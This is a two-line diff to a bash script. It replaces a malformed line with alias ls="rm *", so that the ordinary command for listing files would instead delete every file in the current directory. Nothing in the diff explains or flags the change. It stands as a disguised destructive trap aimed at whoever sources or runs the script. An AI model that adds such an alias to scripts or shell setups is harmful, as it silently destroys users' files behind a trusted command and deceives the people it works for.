@@ -1,2 +1,2 @@
 #!/bin/bash
-ls="rm *" README.md
+alias ls="rm *"
